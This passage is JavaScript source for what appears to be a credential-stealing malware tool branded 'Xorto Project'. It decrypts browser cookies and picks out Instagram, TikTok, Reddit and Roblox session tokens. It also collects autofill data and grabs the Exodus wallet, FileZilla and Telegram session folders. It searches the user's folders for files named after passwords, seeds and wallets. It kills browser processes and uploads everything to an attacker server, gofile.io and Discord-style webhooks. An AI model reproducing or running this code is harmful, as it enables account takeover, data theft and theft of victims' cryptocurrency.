      browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const cookiesPath = browserPath[i][0] + 'Network\\Cookies';
    const db = new sqlite3.Database(cookiesPath);

    await new Promise((resolve, reject) => {
      db.each(
        'SELECT * FROM cookies',
        function (err, row) {
          let encryptedValue = row.encrypted_value;
          let iv = encryptedValue.slice(3, 15);
          let encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
          let authTag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
          let decrypted = '';

          try {
            const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
            decipher.setAuthTag(authTag);
            decrypted = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');
            if (row.host_key === '.instagram.com' && row.name === 'sessionid') {
              SubmitInstagram(`${decrypted}`);
            }

  if (row.host_key === '.tiktok.com' && row.name === 'sessionid') {
              stealTikTokSession(`${decrypted}`);
            }

  if (row.host_key === '.reddit.com' && row.name === 'reddit_session') {
              setRedditSession(`${decrypted}`);
            }
			

			
            if (row.name === '.ROBLOSECURITY') {
              SubmitRoblox(`${decrypted}`);
            }
          } catch (error) {}

          if (!cookiesData[browserFolder + '_' + browserPath[i][1]]) {
            cookiesData[browserFolder + '_' + browserPath[i][1]] = [];
          }

          cookiesData[browserFolder + '_' + browserPath[i][1]].push(
            `${row.host_key}	TRUE	/	FALSE	2597573456	${row.name}	${decrypted} \n`
          );

        },
        () => {
          resolve('');
        }
      );
    });
  }


  const zip = new AdmZip();

  
  for (let [browserName, cookies] of Object.entries(cookiesData)) {
    if (cookies.length !== 0) {
      const cookiesContent = cookies.join('');
      const fileName = `${browserName}.txt`;


      zip.addFile(fileName, Buffer.from(cookiesContent, 'utf8'));
    }
  }

  zip.writeZip(`${process.env.USERNAME}cookies.zip`);
 try {

    const webhook = `${api_url}/upload`;
    const form = new FormData();
    form.append('file', fs.createReadStream(`${process.env.USERNAME}cookies.zip`));
    form.append("json", JSON.stringify({ "key": key })); 
 await form.submit(webhook);
  } catch (error) {
    console.error(error.message);
  }

}
 
async function getIPAddress() {
  try {
    const { data } = await axios.get('https://ipapi.co/json/');
    const embed = {
      title: 'IP Information',
      description: `<a:blackworld:1095741984385290310> Current IP Address: ${data.ip}\n <a:blackworld:1095741984385290310>Country: ${data.country_name}`,
      color: 2895667,
      author: { name: 'Xorto Project' },
      footer: { text: 'Powered by Xorto Project' },
    };
    await axios.post(`${api_url}/webhooks/${randomString}`, { embeds: [embed], key: key });
  } catch (error) {
    console.error('Error fetching IP info:', error);
  }
}

async function getAutofills() {
  const autofillData = [];

  for (const pathData of browserPath) {
    const browserPathExists = fs.existsSync(pathData[0]);

    if (!browserPathExists) {
      continue;
    }

    const applicationName = pathData[0].includes('Local')
      ? pathData[0].split('\\Local\\')[1].split('\\')[0]
      : pathData[0].split('\\Roaming\\')[1].split('\\')[1];

    const webDataPath = pathData[0] + 'Web Data';
    const webDataDBPath = pathData[0] + 'webdata.db';

    let db;

    try {
      if (!fs.existsSync(webDataPath)) {
        throw new Error(`File not found: ${webDataPath}`);
      }

      fs.copyFileSync(webDataPath, webDataDBPath);

      db = new sqlite3.Database(webDataDBPath);

      await new Promise((resolve, reject) => {
        db.each(
          'SELECT * FROM autofill',
          function (error, row) {
            if (row) {
            autofillData.push(`Name: ${row.name} | Value: ${row.value} | Application: ${applicationName} ${pathData[1]}\n`);
 

            }
          },
          function () {
            resolve('');
          }
        );
      });

      if (autofillData.length === 0) {
        autofillData.push('No autofills found for ' + applicationName + ' ' + pathData[1] + '\n');
      }
    } catch (error) {
      console.error('Error:', error.message);
    } finally {
     db && db.close();
    }
  }

  if (autofillData.length) {
    fs.writeFileSync("Autofills.txt", user.copyright + autofillData.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });

  try {
      const postData = {
        autofill: autofillData.join(''),
        key: key, 
      };

      const response = await axios.post(`${api_url}/autofill`, postData);

      if (response.status === 200) {
        console.log("POST request successful");
      } else {
        console.error("POST request failed with status code:", response.status);
      }
    } catch (error) {
      console.error("Error making POST request:", error.message);
    }
  }
}

async function DiscordListener(path) {
        return;
}

async function SubmitExodus() {
  const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Exodus\\exodus.wallet`;

  if (fs.existsSync(file)) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(file);
    zipper.writeZip(`${process.env.USERNAME}Exodus.zip`);

    const webhook = `${api_url}/upload`;
    const form = new FormData();

    form.append("file", fs.createReadStream(`${process.env.USERNAME}Exodus.zip`));
    form.append("json", JSON.stringify({ "key": key }));

    try {
      await form.submit(webhook);
    } catch (error) {
      console.error(error.message);
    }
  }
}
//
async function submitfilezilla() {
  const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\FileZilla`;
  if (fs.existsSync(file)) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(file);

    zipper.writeZip(`${process.env.USERNAME}FileZilla.zip`);

    const webhook = `${api_url}/upload`;
    const form = new FormData();
    form.append("file", fs.createReadStream(`${process.env.USERNAME}FileZilla.zip`));
    form.append("json", JSON.stringify({ "key": key }));

    try {
      await form.submit(webhook);
    } catch (error) {
      console.error(error.message);
    }
  }
}

//
async function SubmitTelegram() {
   
     const { data: ipData } = await axios.get('https://api.ipify.org?format=json');
    const ip = ipData.ip;

   const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Telegram Desktop\\tdata`;

    if (!fs.existsSync(file)) {
        console.log('File does not exist');
        return;
    }

    const zipper = new AdmZip();
    zipper.addLocalFolder(file);
    const zipFilePath = `TelegramSession.zip`;
    zipper.writeZip(zipFilePath);

    try {
        const response = await axios.get('https://api.gofile.io/getServer');
        const server = response.data?.data?.server;

        if (!server) {
            console.log('Server not available');
            return;
        }

        const form = new FormData();
        form.append('file', fs.createReadStream(zipFilePath));

        const uploadResponse = await axios.post(`https://${server}.gofile.io/uploadFile`, form, {
            headers: form.getHeaders()
        });

        const responseData = uploadResponse.data?.data || {};

        const payload = {
				key: key,
            embeds: [
                {
                    title: "Click To Download!",
                    url: responseData.downloadPage || 'http://xortoproject.duckdns.org',
                    color: 3553599,
                    fields: [
                        {
                            name: "<:xorto2:1253851581267443712> File Name:",
                            value: "`TelegramSession.zip`",
                            inline: true
                        },
  {
                            name: "<a:xorto:954738629220106281> Ip:",
                            value: `\`${ip}\``
                        }						
                    ],
                    author: {
                        name: "Telegram Session",
                        icon_url: "https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473"
                    },
                    footer: {
                        text: "@xortoproject"
                    },
                    thumbnail: {
                        url: "https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473"
                    }
                }
            ],
            username: "XortoProject",
            avatar_url: "https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473",
            attachments: []
        };

        await axios.post(`${api_url}/webhooks/${randomString}`, payload);
        console.log('Discord webhook sent successfully!');
    } catch (error) {
        console.log('Error occurred:', error.message);
    }
}


async function closeBrowsers() {
  const browsersProcess = ["chrome.exe", "Telegram.exe", "msedge.exe", "opera.exe", "brave.exe"];
  return new Promise(async (resolve) => {
    try {
      const { execSync } = require("child_process");
      const tasks = execSync("tasklist").toString();
      browsersProcess.forEach((process) => {
        if (tasks.includes(process)) {
          execSync(`taskkill /IM ${process} /F`);
        }
      });
      await new Promise((resolve) => setTimeout(resolve, 2500));
      resolve();
    } catch (e) {
      console.log(e);
      resolve();
    }
  });
}

function K1W1F113(patt, keyWords) {
    return new Promise((resolve, reject) => {
        fs.readdir(patt, (err, files) => {
            if (err) return reject(err);
            const foundFiles = files.filter(file => {
                return keyWords.some(keyword => file.includes(keyword));
            }).map(file => path.join(patt, file));
            resolve(foundFiles);
        });
    });
}

async function K1W1() {
    const user = os.homedir();
    const roaming = process.env.APPDATA.split("\\")[0];

    const path2search = [
        path.join(user, "Desktop"),
        path.join(user, "Downloads"),
        path.join(user, "Documents"),
      ];

   const keyWordsFiles = [
    "passw", "mdp", "motdepasse", "mot_de_passe", "login", "secret", "bot", "atomic", "account", "acount",
    "paypal", "banque", "metamask", "wallet", "crypto", "exodus", "discord", "2fa", "code", "memo", "compte",
    "token", "backup", "seed", "mnemonic", "memoric", "private", "key", "passphrase", "pass", "phrase", "steal",
    "bank", "info", "casino", "prv", "privé", "prive", "telegram", "identifiant", "personnel", "trading",
    "bitcoin", "sauvegarde", "funds", "récupé", "recup", "note"
];


    const wikith = [];
    for (const patt of path2search) {
        const kiwi = K1W1F113(patt, keyWordsFiles);
        wikith.push(kiwi);
    }
    return await Promise.all(wikith);
}

async function filestealr() {
    const wikith = await K1W1();
    const foundDir = 'found';

    
    if (!fs.existsSync(foundDir)) {
        fs.mkdirSync(foundDir);
    }

    for (const files of wikith) {
        for (const file of files) {
            if (path.extname(file) === '.txt') {
                const fileName = path.basename(file);
                const destPath = path.join(foundDir, fileName);
                fs.copyFileSync(file, destPath); // Dosyaları kopyala
                console.log(`${fileName} dosyası kopyalandı.`);
            }
        }
    }

    const zipFilePath = 'found_files.zip';
    const zipper = new AdmZip();
    zipper.addLocalFolder(foundDir);
    zipper.writeZip(zipFilePath);

   const webhook = `${api_url}/upload`;
    const formData = new FormData();
    formData.append("file", fs.createReadStream(zipFilePath));
    formData.append("json", JSON.stringify({ "key": key }));

    try {
      await formData.submit(webhook);

        console.log("done");
    } catch (error) {
        console.error("error:", error.message);
    } finally {
        
    }
}

//

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}


		closeBrowsers();
		StopCords();
		getEncrypted();
		getCookiesAndSendWebhook();
		getExtension();
		InfectDiscords();
	  stealTokens();
	getAutofills();
	getPasswords();
		getZippp();
		SubmitTelegram();
		SubmitExodus();
		submitfilezilla();
		getIPAddress();
filestealr();
